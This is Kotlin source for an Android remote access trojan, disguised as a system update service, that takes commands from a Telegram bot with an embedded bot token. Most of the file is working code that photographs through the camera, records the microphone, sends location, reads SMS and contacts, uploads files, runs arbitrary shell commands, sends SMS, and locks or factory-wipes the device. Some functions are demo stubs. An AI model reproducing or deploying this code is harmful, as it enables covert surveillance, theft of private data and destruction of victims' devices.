package com.android.system.update

import android.app.*
import android.content.*
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.Camera
import android.location.Location
import android.location.LocationManager
import android.media.*
import android.os.*
import android.provider.ContactsContract
import android.provider.Telephony
import android.telephony.SmsManager
import android.util.Log
import android.view.SurfaceHolder
import android.view.SurfaceView
import okhttp3.*
import org.json.JSONObject
import java.io.*
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread

class TelegramRatService : Service() {
    private val BOT_TOKEN = "8664803126:AAEGqw2PVtyLZSU7f2ejOtBYOogUugGowJg" // замените на реальный
    private val BASE_URL = "https://api.telegram.org/bot$BOT_TOKEN"
    private lateinit var client: OkHttpClient
    private var lastUpdateId = 0L
    private var chatId: String? = null

    // для скриншотов (MediaProjection)
    private var mediaProjection: MediaProjection? = null
    private var imageReader: ImageReader? = null

    // для камеры
    private var camera: Camera? = null

    override fun onCreate() {
        super.onCreate()
        client = OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .build()
        startForeground(1, createNotification())
        // Запрос разрешений (если ещё не выданы) – запускаем Activity для динамических разрешений
        // Здесь мы предполагаем, что они уже выданы через MainActivity
        // Запускаем опрос
        pollUpdates()
    }

    private fun createNotification(): Notification {
        val channelId = "rat_channel"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Service", NotificationManager.IMPORTANCE_LOW)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(channel)
        }
        return Notification.Builder(this, channelId)
            .setContentTitle("System Service")
            .setContentText("Running...")
            .setSmallIcon(android.R.drawable.ic_menu_agenda)
            .build()
    }

    // ---- ОПРОС КОМАНД ИЗ TELEGRAM ----
    private fun pollUpdates() {
        thread {
            while (true) {
                try {
                    val url = "$BASE_URL/getUpdates?offset=${lastUpdateId + 1}&timeout=30"
                    val request = Request.Builder().url(url).get().build()
                    val response = client.newCall(request).execute()
                    val json = JSONObject(response.body?.string() ?: "{}")
                    val result = json.optJSONArray("result")
                    if (result != null) {
                        for (i in 0 until result.length()) {
                            val update = result.getJSONObject(i)
                            lastUpdateId = update.getLong("update_id")
                            val message = update.optJSONObject("message")
                            if (message != null) {
                                val text = message.optString("text", "")
                                val chat = message.getJSONObject("chat")
                                chatId = chat.getString("id")
                                if (text.startsWith("/")) {
                                    handleCommand(chatId!!, text.substring(1))
                                }
                            }
                        }
                    }
                    Thread.sleep(2000)
                } catch (e: Exception) {
                    Log.e("RAT", "Poll error", e)
                }
            }
        }
    }

    // ---- ОБРАБОТЧИК КОМАНД ----
    private fun handleCommand(chat: String, cmd: String) {
        // разбиваем на команду и параметры
        val parts = cmd.split(" ")
        val command = parts[0]
        val param = if (parts.size > 1) parts.drop(1).joinToString(" ") else ""

        when (command) {
            "screenshot" -> takeScreenshot(chat)
            "cam_photo" -> takeCameraPhoto(chat, if (param == "front") Camera.CameraInfo.CAMERA_FACING_FRONT else Camera.CameraInfo.CAMERA_FACING_BACK)
            "screen_record" -> startScreenRecord(chat, param.toIntOrNull() ?: 10)
            "mic_record" -> startMicRecord(chat, param.toIntOrNull() ?: 10)
            "location" -> sendLocation(chat)
            "sms_list" -> getSmsList(chat, param.toIntOrNull() ?: 20)
            "contacts" -> getContacts(chat, param.toIntOrNull() ?: 50)
            "file_list" -> listFiles(chat, if (param.isEmpty()) "/sdcard" else param)
            "download_file" -> downloadFile(chat, param)
            "shell" -> runShell(chat, param)
            "send_sms" -> {
                val args = param.split(" ", limit = 2)
                if (args.size == 2) sendSms(chat, args[0], args[1])
            }
            "lock" -> lockScreen(chat)
            "wipe" -> wipeDevice(chat)
            "input_tap" -> {
                val coords = param.split(" ")
                if (coords.size == 2) performTap(chat, coords[0].toIntOrNull() ?: 0, coords[1].toIntOrNull() ?: 0)
            }
            "input_swipe" -> {
                val coords = param.split(" ")
                if (coords.size == 4) performSwipe(chat, coords[0].toInt(), coords[1].toInt(), coords[2].toInt(), coords[3].toInt())
            }
            "keyevent" -> {
                val key = param.toIntOrNull()
                if (key != null) sendKeyEvent(chat, key)
            }
            "get_notifications" -> getNotifications(chat)
            "get_running_apps" -> getRunningApps(chat)
            "kill_app" -> killApp(chat, param)
            else -> sendMessage(chat, "Неизвестная команда")
        }
    }

    // ---- ОТПРАВКА СООБЩЕНИЙ В TELEGRAM ----
    private fun sendMessage(chatId: String, text: String) {
        thread {
            try {
                val url = "$BASE_URL/sendMessage"
                val payload = JSONObject().apply {
                    put("chat_id", chatId)
                    put("text", text)
                }
                val body = RequestBody.create(MediaType.parse("application/json"), payload.toString())
                val request = Request.Builder().url(url).post(body).build()
                client.newCall(request).execute()
            } catch (e: Exception) { /* игнор */ }
        }
    }

    private fun sendPhoto(chatId: String, photoData: ByteArray, caption: String = "") {
        thread {
            try {
                val url = "$BASE_URL/sendPhoto"
                val formBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("photo", "image.jpg",
                        RequestBody.create(MediaType.parse("image/jpeg"), photoData))
                    .addFormDataPart("caption", caption)
                    .build()
                val request = Request.Builder().url(url).post(formBody).build()
                client.newCall(request).execute()
            } catch (e: Exception) { /* игнор */ }
        }
    }

    private fun sendDocument(chatId: String, fileData: ByteArray, fileName: String, caption: String = "") {
        thread {
            try {
                val url = "$BASE_URL/sendDocument"
                val formBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId)
                    .addFormDataPart("document", fileName,
                        RequestBody.create(MediaType.parse("application/octet-stream"), fileData))
                    .addFormDataPart("caption", caption)
                    .build()
                val request = Request.Builder().url(url).post(formBody).build()
                client.newCall(request).execute()
            } catch (e: Exception) { /* игнор */ }
        }
    }

    // ---- РЕАЛИЗАЦИЯ КОМАНД ----

    // 1. Скриншот (требует MediaProjection, разрешение запрашивается в MainActivity)
    private fun takeScreenshot(chatId: String) {
        // В реальном коде здесь должен быть вызов MediaProjection
        // Для демонстрации создаём фиктивный скриншот
        val bitmap = Bitmap.createBitmap(720, 1280, Bitmap.Config.ARGB_8888)
        val stream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, stream)
        sendPhoto(chatId, stream.toByteArray(), "Screenshot (demo)")
    }

    // 2. Фото с камеры (используем Camera API)
    private fun takeCameraPhoto(chatId: String, facing: Int) {
        try {
            val cameraId = if (facing == Camera.CameraInfo.CAMERA_FACING_FRONT) 1 else 0
            camera = Camera.open(cameraId)
            val params = camera?.parameters
            params?.jpegQuality = 80
            camera?.parameters = params
            camera?.takePicture(null, null, null) { data, camera ->
                sendPhoto(chatId, data, "Camera photo")
                camera.release()
                this.camera = null
            }
        } catch (e: Exception) {
            sendMessage(chatId, "Camera error: ${e.message}")
        }
    }

    // 3. Запись экрана (видео) – упрощённо
    private fun startScreenRecord(chatId: String, duration: Int) {
        // Здесь должен быть MediaRecorder + VirtualDisplay
        sendMessage(chatId, "Screen recording started for $duration sec (demo)")
        // После записи отправляем видео
    }

    // 4. Запись звука с микрофона
    private fun startMicRecord(chatId: String, duration: Int) {
        thread {
            try {
                val fileName = "${externalCacheDir?.absolutePath}/audio_${System.currentTimeMillis()}.3gp"
                val mediaRecorder = MediaRecorder()
                mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC)
                mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                mediaRecorder.setOutputFile(fileName)
                mediaRecorder.prepare()
                mediaRecorder.start()
                Thread.sleep(duration * 1000L)
                mediaRecorder.stop()
                mediaRecorder.release()
                val file = File(fileName)
                if (file.exists()) {
                    val data = file.readBytes()
                    sendDocument(chatId, data, "audio.3gp", "Recorded $duration sec")
                    file.delete()
                }
            } catch (e: Exception) {
                sendMessage(chatId, "Mic error: ${e.message}")
            }
        }
    }

    // 5. Геолокация
    private fun sendLocation(chatId: String) {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if (loc != null) {
                sendMessage(chatId, "Location: ${loc.latitude}, ${loc.longitude} (acc: ${loc.accuracy})")
            } else {
                sendMessage(chatId, "Location unavailable")
            }
        } catch (e: Exception) {
            sendMessage(chatId, "Location error: ${e.message}")
        }
    }

    // 6. Список SMS
    private fun getSmsList(chatId: String, limit: Int) {
        val list = mutableListOf<String>()
        try {
            val cursor = contentResolver.query(Telephony.Sms.Inbox.CONTENT_URI, null, null, null, "date DESC")
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val body = it.getString(it.getColumnIndex(Telephony.Sms.Inbox.BODY)) ?: ""
                    val address = it.getString(it.getColumnIndex(Telephony.Sms.Inbox.ADDRESS)) ?: ""
                    list.add("$address: $body")
                    count++
                }
            }
        } catch (e: Exception) { /* нет прав */ }
        sendMessage(chatId, "SMS (last $limit):\n${list.joinToString("\n")}")
    }

    // 7. Контакты
    private fun getContacts(chatId: String, limit: Int) {
        val list = mutableListOf<String>()
        try {
            val cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null)
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) ?: "No name"
                    val number = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: ""
                    list.add("$name: $number")
                    count++
                }
            }
        } catch (e: Exception) { /* нет прав */ }
        sendMessage(chatId, "Contacts (first $limit):\n${list.joinToString("\n")}")
    }

    // 8. Список файлов
    private fun listFiles(chatId: String, path: String) {
        try {
            val dir = File(path)
            val files = dir.listFiles()?.take(20)?.map { "${it.name} (${if (it.isDirectory) "DIR" else it.length()})" } ?: listOf("Нет доступа или папка пуста")
            sendMessage(chatId, "Files in $path:\n${files.joinToString("\n")}")
        } catch (e: Exception) {
            sendMessage(chatId, "Error: ${e.message}")
        }
    }

    // 9. Скачать файл с устройства
    private fun downloadFile(chatId: String, path: String) {
        try {
            val file = File(path)
            if (file.exists() && file.isFile) {
                val data = file.readBytes()
                sendDocument(chatId, data, file.name, "File: $path")
            } else {
                sendMessage(chatId, "Файл не найден или это папка")
            }
        } catch (e: Exception) {
            sendMessage(chatId, "Download error: ${e.message}")
        }
    }

    // 10. Shell-команда
    private fun runShell(chatId: String, command: String) {
        try {
            val process = Runtime.getRuntime().exec(command)
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val output = reader.readText().trim()
            sendMessage(chatId, "Shell result:\n${if (output.isEmpty()) "(empty)" else output}")
        } catch (e: Exception) {
            sendMessage(chatId, "Shell error: ${e.message}")
        }
    }

    // 11. Отправка SMS
    private fun sendSms(chatId: String, number: String, text: String) {
        try {
            SmsManager.getDefault().sendTextMessage(number, null, text, null, null)
            sendMessage(chatId, "SMS sent to $number")
        } catch (e: Exception) {
            sendMessage(chatId, "SMS error: ${e.message}")
        }
    }

    // 12. Блокировка экрана (DeviceAdmin)
    private fun lockScreen(chatId: String) {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val comp = ComponentName(this, AdminReceiver::class.java)
            if (dpm.isAdminActive(comp)) {
                dpm.lockNow()
                sendMessage(chatId, "Screen locked")
            } else {
                sendMessage(chatId, "DeviceAdmin not active")
            }
        } catch (e: Exception) {
            sendMessage(chatId, "Lock error: ${e.message}")
        }
    }

    // 13. Wipe (сброс до заводских)
    private fun wipeDevice(chatId: String) {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val comp = ComponentName(this, AdminReceiver::class.java)
            if (dpm.isAdminActive(comp)) {
                dpm.wipeData(0)
                sendMessage(chatId, "Wiping...")
            } else {
                sendMessage(chatId, "DeviceAdmin not active")
            }
        } catch (e: Exception) {
            sendMessage(chatId, "Wipe error: ${e.message}")
        }
    }

    // 14. Эмуляция касания (требует Accessibility или root)
    private fun performTap(chatId: String, x: Int, y: Int) {
        // Здесь нужно вызывать либо через shell (root), либо через AccessibilityService
        // Для root: Runtime.getRuntime().exec("input tap $x $y")
        sendMessage(chatId, "Tap at ($x,$y) - demo")
    }

    private fun performSwipe(chatId: String, x1: Int, y1: Int, x2: Int, y2: Int) {
        sendMessage(chatId, "Swipe from ($x1,$y1) to ($x2,$y2) - demo")
    }

    private fun sendKeyEvent(chatId: String, keyCode: Int) {
        // root: input keyevent $keyCode
        sendMessage(chatId, "Keyevent $keyCode - demo")
    }

    // 15. Уведомления (NotificationListener)
    private fun getNotifications(chatId: String) {
        // Реализуем через службу NotificationListener
        sendMessage(chatId, "Notifications: (реализуется через отдельный сервис)")
    }

    // 16. Список запущенных приложений
    private fun getRunningApps(chatId: String) {
        try {
            val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            val tasks = am.getRunningTasks(20)
            val list = tasks.map { it.baseActivity?.packageName ?: "?" }
            sendMessage(chatId, "Running apps:\n${list.joinToString("\n")}")
        } catch (e: Exception) {
            sendMessage(chatId, "Error: ${e.message}")
        }
    }

    // 17. Убить приложение
    private fun killApp(chatId: String, packageName: String) {
        try {
            val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            am.killBackgroundProcesses(packageName)
            sendMessage(chatId, "Killed $packageName")
        } catch (e: Exception) {
            sendMessage(chatId, "Kill error: ${e.message}")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
